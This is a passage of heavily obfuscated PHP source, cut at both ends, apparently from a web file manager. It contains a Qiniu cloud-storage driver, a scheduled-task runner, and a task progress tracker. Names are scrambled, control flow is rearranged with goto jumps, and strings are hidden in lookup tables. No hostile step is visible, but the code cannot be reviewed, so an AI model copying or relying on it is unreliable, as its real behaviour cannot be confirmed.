$this->cacheMethod($c‚·»‰”ì¿[205], $AÄòÎæ³ù, !0); } goto eœÍ×²™»š; Bºßñ‹œÉÀ: $c×ö¡İÂ„ = $c‚·»‰”ì¿[43]; $d½ù†ø¨ğã = 1000; $féŠò×Ã‹ç = $this->listItemCache === !1 ? !1 : !0; goto d°¦ƒ‰Âàœ; cÄµ«¤“Î¹: $c‚·»‰”ì¿ =& $_SERVER[±á õÁ]; $AÄòÎæ³ù = trim($AÄòÎæ³ù, $c‚·»‰”ì¿[8]); $Cõ“œëë£Á = empty($AÄòÎæ³ù) ? $c‚·»‰”ì¿[43] : $AÄòÎæ³ù . $c‚·»‰”ì¿[8]; goto Bºßñ‹œÉÀ; eÕ‚ö¾¤å: } public function canRead($b…ß§ˆôäÀ) { return $this->exist($b…ß§ˆôäÀ) ? !0 : !1; } public function canWrite($DµÀÇ®ñƒŒ) { return $this->exist($DµÀÇ®ñƒŒ) ? !0 : !1; } public function getContent($F‚ƒ†……µ´) { return $this->fileSubstr($F‚ƒ†……µ´, 0, -1); } public function setContent($BÓÆ¨äÛ¿‰, $cÂšÖäì£î = '') { $EÍ„±ìò®¢ = $this->tempFile($this->pathThis($BÓÆ¨äÛ¿‰)); file_put_contents($EÍ„±ìò®¢, $cÂšÖäì£î); if ($this->upload($BÓÆ¨äÛ¿‰, $EÍ„±ìò®¢)) { $this->tempFileRemve($EÍ„±ìò®¢); return !0; } return !1; } public function refreshUrls($EŒ¶ÚÒ ¨î) { goto BªäÔ†Ø¹÷; D§Äå½ñ–: $c§ÏÆßÊÀÕ = new Qiniu\Cdn\CdnManager($this->auth); list($AÄÆëá×Œ©, $E»ÖÅĞ¾§¥) = $c§ÏÆßÊÀÕ->refreshUrls($BçÆğÎí­¼); if ($E»ÖÅĞ¾§¥) { return !1; } goto FõØ·Ÿ‚£Ë; BªäÔ†Ø¹÷: $dÎ¥‘´‡ôÄ =& $_SERVER[±á õÁ]; $BçÆğÎí­¼ = array(); if (is_array($EŒ¶ÚÒ ¨î)) { foreach ($EŒ¶ÚÒ ¨î as $A‚•®©×¬) { $BçÆğÎí­¼[] = $this->link($A‚•®©×¬); } } else { $BçÆğÎí­¼[] = $this->link($EŒ¶ÚÒ ¨î); } goto D§Äå½ñ–; FõØ·Ÿ‚£Ë: return $AÄÆëá×Œ©[$dÎ¥‘´‡ôÄ[1240]] == $dÎ¥‘´‡ôÄ[721] ? !0 : !1; goto dóÕá¶Áõì; dóÕá¶Áõì: } public function fileSubstr($e¹·»î¼‘, $A»ÀºÄ²­˜, $BšƒÓ¨ˆ«×) { $e‡”Œš…ë® =& $_SERVER[±á õÁ]; if (!($bÌõß—„ = $this->link($e¹·»î¼‘))) { return !1; } $EÄ®Ô¥È˜ = !1; if ($BšƒÓ¨ˆ«× > 0) { $e›Õ£øÄè = $A»ÀºÄ²­˜ + $BšƒÓ¨ˆ«× - 1; $EÄ®Ô¥È˜ = array($e‡”Œš…ë®[1241] . $A»ÀºÄ²­˜ . $e‡”Œš…ë®[436] . $e›Õ£øÄè); } $E˜ÔˆÎ®ñ¥ = url_request($bÌõß—„, $e‡”Œš…ë®[234], !1, $EÄ®Ô¥È˜); return $E˜ÔˆÎ®ñ¥[$e‡”Œš…ë®[714]] ? $E˜ÔˆÎ®ñ¥[$e‡”Œš…ë®[1056]] : !1; } public function upload($D›Õ¢­©é, $CòñÄ—éã, $eÄß•°² = false, $có½ˆÄ„Ñ¤ = REPEAT_REPLACE) { $aßÍ÷åÅ©à = new Qiniu\Storage\UploadManager(); $dÄŸ†¶¾¯ = $this->auth->uploadToken($this->bucket, $D›Õ¢­©é); $A® ¬§»á = get_file_mime(get_path_ext($CòñÄ—éã)); list($Dï¯°Šö¢«, $aªÉÃÍ”î¿) = $aßÍ÷åÅ©à->putFile($dÄŸ†¶¾¯, $D›Õ¢­©é, $CòñÄ—éã, null, $A® ¬§»á); return $aªÉÃÍ”î¿ ? !1 : $this->getPathOuter($D›Õ¢­©é); } public function uploadFormData($BÕ¤ŒßàË¢, $d³ÉïÏŞ = 3600) { return $this->uploadToken($BÕ¤ŒßàË¢, $d³ÉïÏŞ); } public function multiUploadFormData($c©ÎÕé¥÷, $dùËÙé“‘Ø = 3600) { return $this->uploadToken($c©ÎÕé¥÷, $dùËÙé“‘Ø); } private function uploadToken($B‚ñŸ“•¦À, $D¹¡ò÷áŠß = 3600) { goto dÃ½µ­´¡ ; dÃ½µ­´¡ : $CÖÍâ«ï¯ğ =& $_SERVER[±á õÁ]; $b¬„¨Ã†À = $D¹¡ò÷áŠß; $fàùŞà¿½Ñ = array($CÖÍâ«ï¯ğ[1242] => $CÖÍâ«ï¯ğ[1243]); goto F²Ìˆ²ôó; fÑßÚĞ: $c‹­Ü¶×£ = http_type() . "\x3a\57\x2f\165\x70\154\157\x61\144{$D³ååÈ«¡}\x2e\161\151\x6e\x69\x75\160\56\x63\x6f\155\57"; return array($CÖÍâ«ï¯ğ[1245] => $aå²„ÒæÈ, $CÖÍâ«ï¯ğ[1246] => $c‹­Ü¶×£); goto Bœ ÈùÂà; F²Ìˆ²ôó: $cÔ™ºÜ¾Ç = $B‚ñŸ“•¦À; $aå²„ÒæÈ = $this->auth->uploadToken($this->bucket, $cÔ™ºÜ¾Ç, $b¬„¨Ã†À, $fàùŞà¿½Ñ, !0); $D³ååÈ«¡ = empty($this->region) || $this->region == $CÖÍâ«ï¯ğ[1244] ? $CÖÍâ«ï¯ğ[43] : $CÖÍâ«ï¯ğ[436] . $this->region; goto fÑßÚĞ; Bœ ÈùÂà: } public function download($eŒí´§Ù‘¿, $D–»Ë³ÏÌ˜) { goto f›…»Ñ©ç¯; f›…»Ñ©ç¯: $E¹Í‡òêğ´ = IO::getPathInner(IO::mkfile($D–»Ë³ÏÌ˜)); if (!($D¸‘‰½®æÙ = $this->link($eŒí´§Ù‘¿))) { return !1; } $d¶ÆŸÄÖŒ¿ = 0; goto Eíœ¼ÙÄÆ‹; Eíœ¼ÙÄÆ‹: $f¤š“½š¹Ü = 1024 * 200; $bÛ‡Û³‘­ì = fopen($E¹Í‡òêğ´, $_SERVER[±á õÁ][1247]); while (!0) { $dÛëí¶° = $this->fileSubstr($eŒí´§Ù‘¿, $d¶ÆŸÄÖŒ¿, $f¤š“½š¹Ü); if ($dÛëí¶° === !1) { return !1; } fwrite($bÛ‡Û³‘­ì, $dÛëí¶°); $d¶ÆŸÄÖŒ¿ += $f¤š“½š¹Ü; if (strlen($dÛëí¶°) < $f¤š“½š¹Ü) { break; } } goto B“Ùİ†­øò; B“Ùİ†­øò: fclose($bÛ‡Û³‘­ì); return $D–»Ë³ÏÌ˜; goto dÌñ±‹Ñ¼; dÌñ±‹Ñ¼: } public function link($dİæ˜©êğÓ, $e†ÚóØåŸœ = '') { if (!$this->isFile($dİæ˜©êğÓ)) { return !1; } $CñÔÛ¨ŠøÃ = $this->getHost() . $_SERVER[±á õÁ][8] . $this->pathEncode($dİæ˜©êğÓ) . $e†ÚóØåŸœ; return $this->auth->privateDownloadUrl($CñÔÛ¨ŠøÃ, 3600 * 12); } public function fileOut($CÙ”¹·Œ¨§, $aªÈ¼Ñ°† = false, $BŸ§¨èõİî = false, $a‚İêƒŸÛÉ = '') { $EÎ§¾àÁÁ =& $_SERVER[±á õÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($CÙ”¹·Œ¨§, $aªÈ¼Ñ°†, $BŸ§¨èõİî, $a‚İêƒŸÛÉ); } if (!$BŸ§¨èõİî) { $BŸ§¨èõİî = $this->pathThis($CÙ”¹·Œ¨§); } $BÆƒ”ÏÛÖ = $aªÈ¼Ñ°† ? $EÎ§¾àÁÁ[1248] . rawurlencode($BŸ§¨èõİî) : $EÎ§¾àÁÁ[43]; $Döñ×“Ôøª = $this->link($CÙ”¹·Œ¨§, $BÆƒ”ÏÛÖ); $this->fileOutLink($Döñ×“Ôøª); } public function fileOutServer($DÌ‡´ëõ¶, $EÚÎ¢«ùš¨ = false, $a‹º¦£³æ› = false, $d½ãåŠ‚Ì = '') { parent::fileOut($DÌ‡´ëõ¶, $EÚÎ¢«ùš¨, $a‹º¦£³æ›, $d½ãåŠ‚Ì); } public function fileOutImage($Eğ‡Ù†åù, $f¶¸Åî„¢É = 250) { $a¾ğ’£Ôâó = $this->link($Eğ‡Ù†åù, $_SERVER[±á õÁ][1249] . $f¶¸Åî„¢É); $this->fileOutLink($a¾ğ’£Ôâó); } public function fileOutImageServer($F‡ö÷¢Ä¤´, $e´»ä„–Ô = 250) { parent::fileOutImage($F‡ö÷¢Ä¤´, $e´»ä„–Ô); } public function hashMd5($C¾åÈ ²Âù) { $Bˆ†®õóò =& $_SERVER[±á õÁ]; $Dœ¹Œ¨­Ù = $this->objectMeta($C¾åÈ ²Âù); return isset($Dœ¹Œ¨­Ù[$Bˆ†®õóò[214]]) ? $Dœ¹Œ¨­Ù[$Bˆ†®õóò[214]] : !1; $A‡ÌŒàóË = $this->link($C¾åÈ ²Âù, $Bˆ†®õóò[1250]); } public function size($EäÃ‰³²–ä) { $DÅ£“®†­– = $this->objectMeta($EäÃ‰³²–ä); return $DÅ£“®†­– ? $DÅ£“®†­–[$_SERVER[±á õÁ][87]] : 0; } public function info($B™«×âó¸ ) { if ($this->isFolder($B™«×âó¸ )) { return $this->folderInfo($B™«×âó¸ ); } else { if ($this->isFile($B™«×âó¸ )) { return $this->fileInfo($B™«×âó¸ ); } } return !1; } public function exist($CöÉ«Å‹ïµ) { return $this->isFile($CöÉ«Å‹ïµ) || $this->isFolder($CöÉ«Å‹ïµ); } public function isFile($b¨ø²…˜ £) { return !$this->isFolder($b¨ø²…˜ £) && $this->objectMeta($b¨ø²…˜ £); } public function isFolder($a·ÊŠºÇåŸ) { return $this->cacheMethod($_SERVER[±á õÁ][205], $a·ÊŠºÇåŸ); } protected function objectMeta($Aé×…Ä’£) { return $this->cacheMethod($_SERVER[±á õÁ][206], $Aé×…Ä’£); } protected function _objectMeta($B°öô‡¶ˆÏ) { $aõªÑÁ»µ§ =& $_SERVER[±á õÁ]; list($Fª’”Ä¶Âƒ, $E¦Êƒí¯Š¥) = $this->bucketManager->stat($this->bucket, $B°öô‡¶ˆÏ); if ($Fª’”Ä¶Âƒ) { $Fª’”Ä¶Âƒ[$aõªÑÁ»µ§[87]] = intval($Fª’”Ä¶Âƒ[$aõªÑÁ»µ§[1235]]); } return $Fª’”Ä¶Âƒ; } protected function _isFolder($BÓ´ëÊ¢¿) { $fğ‡ãïÃ» =& $_SERVER[±á õÁ]; if ($BÓ´ëÊ¢¿ == $fğ‡ãïÃ»[43] || $BÓ´ëÊ¢¿ == $fğ‡ãïÃ»[8]) { return !0; } list($FŞÑ‡Ú¦×¹, $b¢§Ø“’¬) = $this->bucketManager->listFiles($this->bucket, trim($BÓ´ëÊ¢¿, $fğ‡ãïÃ»[8]) . $fğ‡ãïÃ»[8], $fğ‡ãïÃ»[43], 1, $fğ‡ãïÃ»[8]); return !empty($FŞÑ‡Ú¦×¹[$fğ‡ãïÃ»[1238]]) || !empty($FŞÑ‡Ú¦×¹[$fğ‡ãïÃ»[1239]]) ? !0 : !1; } } goto e´É³ğ¢¾; e“±äŸƒà: class AutoTask { public static function start() { goto BÁ»Û¾š¸ ; Bƒ£ÛÍë©’: http_close(); self::valueSet($E—èÎÁöî[1426], $E—èÎÁöî[93]); Hook::bind($E—èÎÁöî[1428], $E—èÎÁöî[1429]); goto DöèÃæÂÉ; DöèÃæÂÉ: while (!0) { self::cacheClear(); if (self::valueGet($E—èÎÁöî[714]) != $E—èÎÁöî[93]) { self::valueSet($E—èÎÁöî[1426], $E—èÎÁöî[493]); self::log($E—èÎÁöî[1430]); die; } self::valueSet($E—èÎÁöî[1426], $E—èÎÁöî[93]); self::valueSet($E—èÎÁöî[1427], time()); self::taskRunAll(); sleep(self::valueGet($E—èÎÁöî[1431])); } goto fÏ×Ñ¿¸ó; BÁ»Û¾š¸ : $E—èÎÁöî =& $_SERVER[±á õÁ]; if (self::valueGet($E—èÎÁöî[714]) != $E—èÎÁöî[93]) { return; } if (self::valueGet($E—èÎÁöî[1426]) == $E—èÎÁöî[93]) { $E‚ÃÆÄÉàâ = self::valueGet($E—èÎÁöî[1427]); if (time() - $E‚ÃÆÄÉàâ > 3600 * 2) { self::restart(); } return; } goto Bƒ£ÛÍë©’; fÏ×Ñ¿¸ó: } public static function restart() { $f“ÒÉ­Ğè‘ =& $_SERVER[±á õÁ]; http_close(); self::valueSet($f“ÒÉ­Ğè‘[714], $f“ÒÉ­Ğè‘[493]); sleep(self::valueGet($f“ÒÉ­Ğè‘[1431]) + 5); self::valueSet($f“ÒÉ­Ğè‘[1426], $f“ÒÉ­Ğè‘[493]); self::valueSet($f“ÒÉ­Ğè‘[714], $f“ÒÉ­Ğè‘[93]); } public static function shutdownEvent() { $A¶òšŠæ«Ù =& $_SERVER[±á õÁ]; self::valueSet($A¶òšŠæ«Ù[1426], $A¶òšŠæ«Ù[493]); self::log($A¶òšŠæ«Ù[1432]); } public static function config($c†„öÏæèï, $A™ˆóó¤¸›) { $c‰´íÃùÒ =& $_SERVER[±á õÁ]; $B³ìËÔÚ¨ = 10; $A™ˆóó¤¸› = intval($A™ˆóó¤¸›) <= $B³ìËÔÚ¨ ? $B³ìËÔÚ¨ : intval($A™ˆóó¤¸›); self::valueSet($c‰´íÃùÒ[714], $c†„öÏæèï); self::valueSet($c‰´íÃùÒ[1431], $A™ˆóó¤¸›); } private static function taskRunAll() { goto b°É™æÆì; eÎÄ‡ŠÚ á: $A”¬Ô£ùÈ¤ = count($bøÜ¢Ø¤¾´); for ($aƒšŒæŠÁ¢ = 0; $aƒšŒæŠÁ¢ < $A”¬Ô£ùÈ¤; $aƒšŒæŠÁ¢++) { $D¾¡ğõâ = $bøÜ¢Ø¤¾´[$aƒšŒæŠÁ¢]; if ($D¾¡ğõâ[$DÔ¨­æÆ[1434]] != $DÔ¨­æÆ[93]) { continue; } if (!self::taskTimeCheck($D¾¡ğõâ)) { continue; } self::taskRun($D¾¡ğõâ); } Hook::trigger($DÔ¨­æÆ[1435]); goto b²ŸÈ¶­ÀÄ; b°É™æÆì: $DÔ¨­æÆ =& $_SERVER[±á õÁ]; $dÌ÷êƒšš = timeFloat(); $bøÜ¢Ø¤¾´ = Model($DÔ¨­æÆ[1433])->listData(); goto eÎÄ‡ŠÚ á; b²ŸÈ¶­ÀÄ: self::taskQueueRun($dÌ÷êƒšš); self::closeDatabase(); goto AÔËè¡Ì‹; AÔËè¡Ì‹: } private static function taskQueueRun($dŞõĞÖï) { $aº‰¶ÆÉ¼· = 10; while (!0) { $bÎÛ¢»„Ì§ = TaskQueue::run(); if ($bÎÛ¢»„Ì§ === !1) { break; } if (timeFloat() - $dŞõĞÖï >= $aº‰¶ÆÉ¼·) { break; } } } private static function taskTimeCheck($A¿¥¬¾«ã) { goto cºÉœâÎÂÒ; FÃ…–ìÅÔ°: $aˆ¦ïÃæé = strtotime($fÊ¸ÀÕÕ¼Á[1436] . $dçå© «öç[$fÊ¸ÀÕÕ¼Á[1437]] . $fÊ¸ÀÕÕ¼Á[1438]) - strtotime($fÊ¸ÀÕÕ¼Á[1439]); $D°Ş»Šñ¤Ä = time() - strtotime(date($fÊ¸ÀÕÕ¼Á[1440]) . $fÊ¸ÀÕÕ¼Á[1441]); $aÍ³»ÈËÕĞ = $D°Ş»Šñ¤Ä >= $aˆ¦ïÃæé && $D°Ş»Šñ¤Ä <= $aˆ¦ïÃæé + 3600; goto aƒÙÚÚõ§; cºÉœâÎÂÒ: $fÊ¸ÀÕÕ¼Á =& $_SERVER[±á õÁ]; $dçå© «öç = json_decode($A¿¥¬¾«ã[$fÊ¸ÀÕÕ¼Á[203]], !0); $fØ±»£Ó…Ø = intval($A¿¥¬¾«ã[$fÊ¸ÀÕÕ¼Á[1427]]); goto FÃ…–ìÅÔ°; aƒÙÚÚõ§: switch ($dçå© «öç[$fÊ¸ÀÕÕ¼Á[39]]) { case $fÊ¸ÀÕÕ¼Á[1442]: if (time() - $fØ±»£Ó…Ø < 3600 * 24 * 30) { return !1; } if ($dçå© «öç[$fÊ¸ÀÕÕ¼Á[1442]] == date($fÊ¸ÀÕÕ¼Á[1443]) && $aÍ³»ÈËÕĞ) { return !0; } break; case $fÊ¸ÀÕÕ¼Á[1444]: if (time() - $fØ±»£Ó…Ø < 3600 * 24 * 7) { return !1; } $f“ó…ÈêŞ = date($fÊ¸ÀÕÕ¼Á[1445]) == 0 ? 7 : date($fÊ¸ÀÕÕ¼Á[1445]); if ($dçå© «öç[$fÊ¸ÀÕÕ¼Á[1444]] == $f“ó…ÈêŞ && $aÍ³»ÈËÕĞ) { return !0; } break; case $fÊ¸ÀÕÕ¼Á[1437]: if (time() - $fØ±»£Ó…Ø < 3600 * 24) { return !1; } if ($aÍ³»ÈËÕĞ) { return !0; } break; case $fÊ¸ÀÕÕ¼Á[1446]: if (time() - $fØ±»£Ó…Ø >= floatval($dçå© «öç[$fÊ¸ÀÕÕ¼Á[1446]]) * 60) { return !0; } break; default: break; } return !1; goto b²îÚÚ‡Ò; b²îÚÚ‡Ò: } private function closeDatabase() { goto E¶¼ª©™ª·; F´óÜ¹èº§: if (!$CâŠÖ…‰») { $CâŠÖ…‰» = time(); } if (time() - $CâŠÖ…‰» < $B¡•«–É—) { return; } $CâŠÖ…‰» = time(); goto bÚê³³è¾’; E¶¼ª©™ª·: $D™ˆ£¾­Ø² =& $_SERVER[±á õÁ]; static $CâŠÖ…‰» = 0; $B¡•«–É— = 1800; goto F´óÜ¹èº§; bÚê³³è¾’: $aÖõÜà­æ† = Model($D™ˆ£¾­Ø²[499])->db($D™ˆ£¾­Ø²[43]); if ($aÖõÜà­æ†) { $aÖõÜà­æ†->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($D™ˆ£¾­Ø²[1447], $D™ˆ£¾­Ø²[1448]); die; } goto eŸ¼—ñ·Ï; eŸ¼—ñ·Ï: } public static function taskRun($E˜ä†àÅ— ) { goto E¿…ÚÖÛ¸Ø; Dë•½¦œ»Í: Model($FÎ‘èÒ”[1453])->add(array($FÎ‘èÒ”[1454] => $FÎ‘èÒ”[43], $FÎ‘èÒ”[1455] => $FÎ‘èÒ”[493], $FÎ‘èÒ”[39] => $FÎ‘èÒ”[1456] . $E˜ä†àÅ— [$FÎ‘èÒ”[391]], $FÎ‘èÒ”[1457] => json_encode(array($FÎ‘èÒ”[38] => $E˜ä†àÅ— [$FÎ‘èÒ”[38]], $FÎ‘èÒ”[1458] => timeFloat() - $EÛƒˆªˆÚö, $FÎ‘èÒ”[296] => $EîÀÇœÏ½)))); self::log($FÎ‘èÒ”[1459] . $E˜ä†àÅ— [$FÎ‘èÒ”[391]] . $FÎ‘èÒ”[1460] . $EîÀÇœÏ½); return !0; goto Eç¦Ø‰¢„Ø; E¿…ÚÖÛ¸Ø: $FÎ‘èÒ” =& $_SERVER[±á õÁ]; self::log($FÎ‘èÒ”[1449] . $E˜ä†àÅ— [$FÎ‘èÒ”[391]] . $FÎ‘èÒ”[1450] . $E˜ä†àÅ— [$FÎ‘èÒ”[38]] . $FÎ‘èÒ”[1451] . $E˜ä†àÅ— [$FÎ‘èÒ”[1452]]); Model($FÎ‘èÒ”[1433])->run($E˜ä†àÅ— [$FÎ‘èÒ”[391]]); goto EãŞšÕ‹; EãŞšÕ‹: $EÛƒˆªˆÚö = timeFloat(); $EîÀÇœÏ½ = $FÎ‘èÒ”[43]; switch ($E˜ä†àÅ— [$FÎ‘èÒ”[39]]) { case $FÎ‘èÒ”[310]: $CÍæË±÷Šë = url_request($E˜ä†àÅ— [$FÎ‘èÒ”[1452]], $FÎ‘èÒ”[234], !1, !1, !1, !1, 5); $EîÀÇœÏ½ = strlen($CÍæË±÷Šë); break; case $FÎ‘èÒ”[233]: $EîÀÇœÏ½ = Hook::apply($E˜ä†àÅ— [$FÎ‘èÒ”[1452]]); default: break; } goto Dë•½¦œ»Í; Eç¦Ø‰¢„Ø: } private static function valueGet($a‚ŸÓ·Œ–Œ) { $FŸ„®î§Ù± =& $_SERVER[±á õÁ]; $d¥£ƒêˆ¤ò = $FŸ„®î§Ù±[1461]; $e¸µéàÌå¾ = Model($FŸ„®î§Ù±[1462])->get($a‚ŸÓ·Œ–Œ, $d¥£ƒêˆ¤ò); if (is_null($e¸µéàÌå¾)) { Model($FŸ„®î§Ù±[1462])->set($FŸ„®î§Ù±[1431], 10, $d¥£ƒêˆ¤ò); Model($FŸ„®î§Ù±[1462])->set($FŸ„®î§Ù±[714], $FŸ„®î§Ù±[93], $d¥£ƒêˆ¤ò); Model($FŸ„®î§Ù±[1462])->set($FŸ„®î§Ù±[1426], $FŸ„®î§Ù±[493], $d¥£ƒêˆ¤ò); $e¸µéàÌå¾ = Model($FŸ„®î§Ù±[1462])->get($a‚ŸÓ·Œ–Œ, $d¥£ƒêˆ¤ò); } return $e¸µéàÌå¾; } private static function valueSet($FÏäğÊÉÄ­, $F‚Äœ¡×î²) { $FîÍËíö¯Ç =& $_SERVER[±á õÁ]; return Model($FîÍËíö¯Ç[1462])->set($FÏäğÊÉÄ­, $F‚Äœ¡×î², $FîÍËíö¯Ç[1461]); } protected static function log($Bï¾š¥²Äß) { write_log($Bï¾š¥²Äß, $_SERVER[±á õÁ][1448]); } private static function cacheClear() { $c´‹”†ˆ ¦ =& $_SERVER[±á õÁ]; $b»‡íôè¸ù = Model($c´‹”†ˆ ¦[1462])->cacheKey($c´‹”†ˆ ¦[1461]); Cache::clearMemory($b»‡íôè¸ù); Model($c´‹”†ˆ ¦[1433])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\x67"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($fŞ™çì†¯í, $C¹é““ñÎÚ = '', $E…š´Œ¹Õ = 0, $A¤á÷À½ì = '') { goto dÊ›ïÜ¿ÂÄ; dÊ›ïÜ¿ÂÄ: $D£¦Ãè¤èó =& $_SERVER[±á õÁ]; if (self::get($fŞ™çì†¯í)) { return; } $this->task = array($D£¦Ãè¤èó[391] => $fŞ™çì†¯í, $D£¦Ãè¤èó[1463] => USER_ID, $D£¦Ãè¤èó[1366] => $A¤á÷À½ì, $D£¦Ãè¤èó[39] => $C¹é““ñÎÚ, $D£¦Ãè¤èó[996] => $D£¦Ãè¤èó[43], $D£¦Ãè¤èó[994] => $E…š´Œ¹Õ, $D£¦Ãè¤èó[1008] => 0, $D£¦Ãè¤èó[1464] => 0, $D£¦Ãè¤èó[1465] => 0, $D£¦Ãè¤èó[1466] => timeFloat(), $D£¦Ãè¤èó[1467] => 0, $D£¦Ãè¤èó[1468] => 0, $D£¦Ãè¤èó[1469] => 0, $D£¦Ãè¤èó[1470] => 0, $D£¦Ãè¤èó[714] => $D£¦Ãè¤èó[1426]); goto a¦«—Á£…; A¦»Í—©ñ÷: Hook::trigger($D£¦Ãè¤èó[1474], $this->task); $this->task[$D£¦Ãè¤èó[1468]] = timeFloat(); goto cŠœÄô‘±©; a¦«—Á£…: Hook::bind($D£¦Ãè¤èó[1428], array($this, $D£¦Ãè¤èó[1471])); Hook::bind($D£¦Ãè¤èó[1472], array($this, $D£¦Ãè¤èó[1473])); $this->startAfter(); goto A¦»Í—©ñ÷; cŠœÄô‘±©: } public function end() { goto Eß–²®¡¡ª; Eß–²®¡¡ª: $fª‚š…Á‘ =& $_SERVER[±á õÁ]; if (!$this->task) { return; } if ($this->task[$fª‚š…Á‘[1468]]) { self::valueSet($this->task[$fª‚š…Á‘[391]], !1); } goto DËÀ²İ©º; AÖ‰ª§¦Ö„: Hook::unbind($fª‚š…Á‘[1472], array($this, $fª‚š…Á‘[1473])); $this->endAfter(); $this->task = !1; goto C¦ÈÃîˆæŞ; DËÀ²İ©º: $dÕÔÑöÂØª = timeFloat() - $this->task[$fª‚š…Á‘[1466]]; self::log($fª‚š…Á‘[1475] . $this->task[$fª‚š…Á‘[391]] . $fª‚š…Á‘[1476] . $dÕÔÑöÂØª . $fª‚š…Á‘[1477]); Hook::unbind($fª‚š…Á‘[1428], array($this, $fª‚š…Á‘[1471])); goto AÖ‰ª§¦Ö„; C¦ÈÃîˆæŞ: } public function update($D­‚ˆÉ…˜Â = 0, $Cî„åìØÑÂ = false) { goto d‘äÀ†³ÒÓ; F¤º› ×´õ: $eÖÓŞ‚…¯‹ = self::get($f®¢ë¦±õ½[$FÛ‰öÛµÜ[391]]); $F³Ö¸ÌìÃ = $eÖÓŞ‚…¯‹[$FÛ‰öÛµÜ[714]]; if ($F³Ö¸ÌìÃ == self::STATYS_KILL) { $a÷Ş•é„Şè = array($FÛ‰öÛµÜ[1478] => LNG($FÛ‰öÛµÜ[1479]), $FÛ‰öÛµÜ[1054] => !1); Cache::set($FÛ‰öÛµÜ[1480] . $this->task[$FÛ‰öÛµÜ[391]], $a÷Ş•é„Şè, 30); $this->end(); die; } else { if ($F³Ö¸ÌìÃ == self::STATYS_STOP) { $dğÕ¶›ô¯ = 2; $eÖÓŞ‚…¯‹[$FÛ‰öÛµÜ[1469]] += $dğÕ¶›ô¯; self::valueSet($f®¢ë¦±õ½[$FÛ‰öÛµÜ[391]], $eÖÓŞ‚…¯‹); sleep($dğÕ¶›ô¯); $this->update(); return; } } goto FÓ§óîòÜä; d‘äÀ†³ÒÓ: $FÛ‰öÛµÜ =& $_SERVER[±á õÁ]; $f®¢ë¦±õ½ =& $this->task; if (!$f®¢ë¦±õ½) { return; } goto B¬…ğ‡ä¥­; B¬…ğ‡ä¥­: $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1008]] += $D­‚ˆÉ…˜Â; $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1467]] = timeFloat(); if ($f®¢ë¦±õ½[$FÛ‰öÛµÜ[994]]) { if ($f®¢ë¦±õ½[$FÛ‰öÛµÜ[994]] < $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1008]]) { $f®¢ë¦±õ½[$FÛ‰öÛµÜ[994]] = $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1008]]; } $b×¼œô¡æĞ = timeFloat() - $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1466]] - $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1469]]; $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1464]] = $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1008]] / $f®¢ë¦±õ½[$FÛ‰öÛµÜ[994]]; $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1465]] = $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1008]] / $b×¼œô¡æĞ; if ($f®¢ë¦±õ½[$FÛ‰öÛµÜ[1464]] > 0) { $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1470]] = $b×¼œô¡æĞ * (1 - $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1464]]) / $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1464]]; } $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1470]] = $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1470]] <= 0 ? 0 : $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1470]]; } goto A¥šµ¤Æ„; FÓ§óîòÜä: $f®¢ë¦±õ½[$FÛ‰öÛµÜ[714]] = $F³Ö¸ÌìÃ ? $F³Ö¸ÌìÃ : $f®¢ë¦±õ½[$FÛ‰öÛµÜ[714]]; $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1469]] = $eÖÓŞ‚…¯‹[$FÛ‰öÛµÜ[1469]] ? $eÖÓŞ‚…¯‹[$FÛ‰öÛµÜ[1469]] : 0; $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1468]] = timeFloat(); goto cÛëÂºÒø; cÛëÂºÒø: Hook::trigger($FÛ‰öÛµÜ[1481], $f®¢ë¦±õ½); self::valueSet($f®¢ë¦±õ½[$FÛ‰öÛµÜ[391]], $f®¢ë¦±õ½); goto eİ•°º³; A¥šµ¤Æ„: $this->updateAfter(); $FˆŒÅ”Ù = 0.2; if (timeFloat() - $f®¢ë¦±õ½[$FÛ‰öÛµÜ[1468]] < $FˆŒÅ”Ù && !$Cî„åìØÑÂ) { return; } goto F¤º› ×´õ; eİ•°º³: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($A¢Ÿ¬»èµ) { $dçøàÛãø„ =& $_SERVER[±á õÁ]; Cache::set($dçøàÛãø„[1480] . $this->task[$dçøàÛãø„[391]], $A¢Ÿ¬»èµ, 60); return $A¢Ÿ¬»èµ; } public static function get($a´¯˜…ç) { return self::valueGet($a´¯˜…ç); } public static function listData() { $c÷¨¾ˆ‡¸ = self::valueGet(); return array_sort_by($c÷¨¾ˆ‡¸, $_SERVER[±á õÁ][1466], !0); } public static function kill($DÇàƒÙ¬ å) { return self::changeStatus($DÇàƒÙ¬ å, self::STATYS_KILL); } public static function stop($E³¾Ğ öí¾) { return self::changeStatus($E³¾Ğ öí¾, self::STATYS_STOP); } public static function restart($dŠˆ¹ˆÈìÇ) { return self::changeStatus($dŠˆ¹ˆÈìÇ, self::STATYS_RUNNING); } public static function killAll() { $D¯ÅĞÑ¸µŞ =& $_SERVER[±á õÁ]; $b­Œ®â‰ÆŒ = self::listData(); foreach ($b­Œ®â‰ÆŒ as $D®°¨óÓ) { self::kill($D®°¨óÓ[$D¯ÅĞÑ¸µŞ[391]]); } sleep(2); foreach ($b­Œ®â‰ÆŒ as $D®°¨óÓ) { self::valueSet($D®°¨óÓ[$D¯ÅĞÑ¸µŞ[391]], !1); } } private static function changeStatus($cğœĞ²Îë˜, 